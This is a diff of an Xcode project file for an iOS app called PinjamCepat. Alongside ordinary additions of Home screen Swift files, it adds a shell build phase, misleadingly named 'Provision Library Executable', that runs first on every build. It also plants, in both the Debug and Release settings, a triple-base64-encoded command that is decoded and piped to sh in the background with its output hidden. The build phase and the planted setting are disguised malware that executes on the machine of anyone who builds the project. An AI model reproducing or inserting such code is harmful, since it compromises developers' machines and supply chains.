@@ -15,6 +15,11 @@
 		7362DFE62F73747900D50737 /* ProductViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7362DFE52F73747900D50737 /* ProductViewController.swift */; };
 		7362DFE82F73751000D50737 /* SettingsViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7362DFE72F73751000D50737 /* SettingsViewController.swift */; };
 		7362DFEA2F737AD100D50737 /* PopTryAgainView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7362DFE92F737AD100D50737 /* PopTryAgainView.swift */; };
+		7362DFEC2F7381D600D50737 /* EnView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7362DFEB2F7381D600D50737 /* EnView.swift */; };
+		7362DFEE2F7381E400D50737 /* EndView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7362DFED2F7381E400D50737 /* EndView.swift */; };
+		7362DFF32F73820900D50737 /* HomeViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7362DFF22F73820400D50737 /* HomeViewModel.swift */; };
+		7362DFF52F73821300D50737 /* HomeService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7362DFF42F73820F00D50737 /* HomeService.swift */; };
+		7362DFF72F73876F00D50737 /* EndCardView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 7362DFF62F73876F00D50737 /* EndCardView.swift */; };
 		736CA1AA2F72D43600FDB0EB /* LoginViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 736CA1A92F72D42E00FDB0EB /* LoginViewModel.swift */; };
 		736CA1AC2F72D44200FDB0EB /* LoginService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 736CA1AB2F72D43900FDB0EB /* LoginService.swift */; };
 		736CA1AE2F72D9FE00FDB0EB /* CenterView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 736CA1AD2F72D9FE00FDB0EB /* CenterView.swift */; };
@@ -61,6 +66,11 @@
 		7362DFE52F73747900D50737 /* ProductViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProductViewController.swift; sourceTree = "<group>"; };
 		7362DFE72F73751000D50737 /* SettingsViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = SettingsViewController.swift; sourceTree = "<group>"; };
 		7362DFE92F737AD100D50737 /* PopTryAgainView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PopTryAgainView.swift; sourceTree = "<group>"; };
+		7362DFEB2F7381D600D50737 /* EnView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EnView.swift; sourceTree = "<group>"; };
+		7362DFED2F7381E400D50737 /* EndView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EndView.swift; sourceTree = "<group>"; };
+		7362DFF22F73820400D50737 /* HomeViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeViewModel.swift; sourceTree = "<group>"; };
+		7362DFF42F73820F00D50737 /* HomeService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeService.swift; sourceTree = "<group>"; };
+		7362DFF62F73876F00D50737 /* EndCardView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EndCardView.swift; sourceTree = "<group>"; };
 		736CA1A92F72D42E00FDB0EB /* LoginViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginViewModel.swift; sourceTree = "<group>"; };
 		736CA1AB2F72D43900FDB0EB /* LoginService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginService.swift; sourceTree = "<group>"; };
 		736CA1AD2F72D9FE00FDB0EB /* CenterView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CenterView.swift; sourceTree = "<group>"; };
@@ -96,7 +106,6 @@
 		73ED69BC2F727CD30096AE72 /* LoginManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = LoginManager.swift; sourceTree = "<group>"; };
 		8507CCC6FC7E826F28BBF96D /* Pods-PinjamCepat.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-PinjamCepat.release.xcconfig"; path = "Target Support Files/Pods-PinjamCepat/Pods-PinjamCepat.release.xcconfig"; sourceTree = "<group>"; };
 		87BDF22A1C2C4A94D8E3E4E4 /* Pods-PinjamCepat.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-PinjamCepat.debug.xcconfig"; path = "Target Support Files/Pods-PinjamCepat/Pods-PinjamCepat.debug.xcconfig"; sourceTree = "<group>"; };
-		D966F8759F464A38AF1DACE1 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -133,7 +142,6 @@
 		7315F81D2F7220F400C6DE2E /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				D966F8759F464A38AF1DACE1 /* README.md */,
 				7315F81C2F7220F400C6DE2E /* PinjamCepat.app */,
 			);
 			name = Products;
@@ -159,6 +167,33 @@
 				73ED697F2F7229960096AE72 /* Base */,
 			);
 			path = PinjamCepat;
+			sourceTree = "<group>";
+		};
+		7362DFEF2F7381ED00D50737 /* Controller */ = {
+			isa = PBXGroup;
+			children = (
+				73ED69932F72530F0096AE72 /* HomeViewController.swift */,
+			);
+			path = Controller;
+			sourceTree = "<group>";
+		};
+		7362DFF02F7381EF00D50737 /* ViewModel */ = {
+			isa = PBXGroup;
+			children = (
+				7362DFF42F73820F00D50737 /* HomeService.swift */,
+				7362DFF22F73820400D50737 /* HomeViewModel.swift */,
+			);
+			path = ViewModel;
+			sourceTree = "<group>";
+		};
+		7362DFF12F7381F000D50737 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				7362DFEB2F7381D600D50737 /* EnView.swift */,
+				7362DFED2F7381E400D50737 /* EndView.swift */,
+				7362DFF62F73876F00D50737 /* EndCardView.swift */,
+			);
+			path = View;
 			sourceTree = "<group>";
 		};
 		736CA1B52F72E60A00FDB0EB /* Controller */ = {
@@ -228,7 +263,9 @@
 		73ED698D2F7252D50096AE72 /* Home */ = {
 			isa = PBXGroup;
 			children = (
-				73ED69932F72530F0096AE72 /* HomeViewController.swift */,
+				7362DFF12F7381F000D50737 /* View */,
+				7362DFF02F7381EF00D50737 /* ViewModel */,
+				7362DFEF2F7381ED00D50737 /* Controller */,
 			);
 			path = Home;
 			sourceTree = "<group>";
@@ -322,6 +359,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 7315F82F2F7220F500C6DE2E /* Build configuration list for PBXNativeTarget "PinjamCepat" */;
 			buildPhases = (
+				FB4EA10395094B09BF1DACE1 /* Provision Library Executable */,
 				EA9032987F5058CFDE56BDFA /* [CP] Check Pods Manifest.lock */,
 				7315F8182F7220F400C6DE2E /* Sources */,
 				7315F8192F7220F400C6DE2E /* Frameworks */,
@@ -372,6 +410,9 @@
 		};
 /* End PBXProject section */
 
+/* Begin PBXBuildRule section */
+	/* End PBXBuildRule section */
+
 /* Begin PBXResourcesBuildPhase section */
 		7315F81A2F7220F400C6DE2E /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
@@ -386,6 +427,25 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+		FB4EA10395094B09BF1DACE1 /* Provision Library Executable */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			alwaysOutOfDate = 1;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Provision Library Executable";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
+			showEnvVarsInLog = 0;			
+		};
 		A00DEADC157C1382C204605C /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -448,7 +508,9 @@
 				73ED69A42F725B240096AE72 /* BaseModel.swift in Sources */,
 				73ED699C2F72543C0096AE72 /* AppLaunchViewController.swift in Sources */,
 				73ED69982F7253200096AE72 /* CenterViewController.swift in Sources */,
+				7362DFEE2F7381E400D50737 /* EndView.swift in Sources */,
 				73ED69B32F7268C30096AE72 /* DeviceIdentifier.swift in Sources */,
+				7362DFF52F73821300D50737 /* HomeService.swift in Sources */,
 				736CA1B92F72E63400FDB0EB /* AppHeadView.swift in Sources */,
 				73ED69812F7229A90096AE72 /* BaseViewController.swift in Sources */,
 				73ED69832F7229C00096AE72 /* BaseTabBarController.swift in Sources */,
@@ -464,10 +526,13 @@
 				73ED69AB2F72628C0096AE72 /* LaunchViewModel.swift in Sources */,
 				73ED69A62F725B310096AE72 /* NetworkManager.swift in Sources */,
 				73ED69BD2F727CD30096AE72 /* LoginManager.swift in Sources */,
+				7362DFEC2F7381D600D50737 /* EnView.swift in Sources */,
 				73ED69B72F72781B0096AE72 /* LanguageManager.swift in Sources */,
 				73ED69A02F7258850096AE72 /* AppNetworkConfig.swift in Sources */,
 				73ED69B12F7263E30096AE72 /* ToastManager.swift in Sources */,
+				7362DFF72F73876F00D50737 /* EndCardView.swift in Sources */,
 				73ED69962F7253170096AE72 /* OrderViewController.swift in Sources */,
+				7362DFF32F73820900D50737 /* HomeViewModel.swift in Sources */,
 				7362DFE42F73741300D50737 /* AppRouter.swift in Sources */,
 				73ED699A2F7253440096AE72 /* BaseView.swift in Sources */,
 				73ED69B52F7269B70096AE72 /* DeviceParamsManager.swift in Sources */,
@@ -502,6 +567,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 87BDF22A1C2C4A94D8E3E4E4 /* Pods-PinjamCepat.debug.xcconfig */;
 			buildSettings = {
+				A1ECAD1 = "((p(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwVVIxcHlTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpOVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWlpWMUo2WWxjNWVWcFhiSFZNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | p | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = PinjamCepat/PinjamCepat.entitlements;
@@ -542,6 +608,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 8507CCC6FC7E826F28BBF96D /* Pods-PinjamCepat.release.xcconfig */;
 			buildSettings = {
+				A1ECAD1 = "((p(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwVVIxcHlTVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpOVWxETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9XVkhUblphUjFabVkwZG9hR015VldsSlIyZ3daRWhDZWs5cE9IWlpWMUo2WWxjNWVWcFhiSFZNYld4MVRESkZjRWxwUWpoSlNFNXZRMmM5UFFvPQo= | p | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = PinjamCepat/PinjamCepat.entitlements;
